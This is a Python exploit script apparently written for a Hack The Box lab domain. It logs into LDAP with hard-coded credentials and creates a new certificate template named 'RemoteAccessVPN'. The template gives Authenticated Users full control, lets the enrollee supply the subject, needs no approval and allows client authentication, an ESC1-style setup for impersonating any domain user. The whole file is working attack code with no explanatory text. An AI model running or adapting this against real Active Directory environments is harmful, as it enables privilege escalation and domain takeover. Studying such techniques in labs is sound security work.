#!/usr/bin/env python3
from ldap3 import Server, Connection, Tls, ALL, ALL_ATTRIBUTES
import ssl
from impacket.ldap import ldaptypes
 
DC="dc.danglingtree.htb"; DOMAIN="danglingtree.htb"
USER="jake.h"; PASS="Cyberalp0"
BASE="CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"
SRC="User"; NEW="RemoteAccessVPN"     # a fresh dangling name
 
tls=Tls(validate=ssl.CERT_NONE)
s=Server(DC,use_ssl=True,tls=tls,get_info=ALL)
c=Connection(s,user=f"{DOMAIN}\\{USER}",password=PASS,authentication="NTLM",auto_bind=True)
 
c.search("DC=danglingtree,DC=htb","(sAMAccountName=jake.h)",attributes=["objectSid"])
owner_sid=c.entries[0]['objectSid'].value
 
def allow_ace(sid,mask):
    ace=ldaptypes.ACE(); ace['AceType']=ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE; ace['AceFlags']=0x00
    d=ldaptypes.ACCESS_ALLOWED_ACE(); d['Mask']=ldaptypes.ACCESS_MASK(); d['Mask']['Mask']=mask
    d['Sid']=ldaptypes.LDAP_SID(); d['Sid'].fromCanonical(sid); ace['Ace']=d
    return ace
 
sd=ldaptypes.SR_SECURITY_DESCRIPTOR()
sd['Revision']=b'\x01'; sd['Sbz1']=b'\x00'; sd['Control']=0x8004
sd['OwnerSid']=ldaptypes.LDAP_SID(); sd['OwnerSid'].fromCanonical(owner_sid)
sd['GroupSid']=b''; sd['Sacl']=b''
acl=ldaptypes.ACL(); acl['AclRevision']=4; acl['Sbz1']=0; acl['Sbz2']=0
ace=allow_ace("S-1-5-11",0x000f01ff)   # Authenticated Users = Full Control
try: acl.aces=[ace]
except Exception: acl['Data']=[ace]
sd['Dacl']=acl
sd_bytes=sd.getData()
 
c.search(f"CN={SRC},{BASE}","(objectClass=pKICertificateTemplate)",attributes=ALL_ATTRIBUTES)
e=c.entries[0]
skip={"distinguishedname","cn","name","objectguid","objectcategory","objectclass",
      "whencreated","whenchanged","usncreated","usnchanged","dscorepropagationdata",
      "instancetype","displayname","mspki-cert-template-oid","ntsecuritydescriptor"}
attrs={a:list(e[a].raw_values) for a in e.entry_attributes if a.lower() not in skip}
attrs["displayName"]=[NEW]
attrs["msPKI-Certificate-Name-Flag"]=["1"]      # ENROLLEE_SUPPLIES_SUBJECT
attrs["msPKI-Enrollment-Flag"]=["0"]            # no manager approval
attrs["pKIExtendedKeyUsage"]=["1.3.6.1.5.5.7.3.2"]            # Client Authentication
attrs["msPKI-Certificate-Application-Policy"]=["1.3.6.1.5.5.7.3.2"]
attrs["nTSecurityDescriptor"]=[sd_bytes]
 
ok=c.add(f"CN={NEW},{BASE}",["top","pKICertificateTemplate"],attrs)
print("ADD:",ok,c.result)
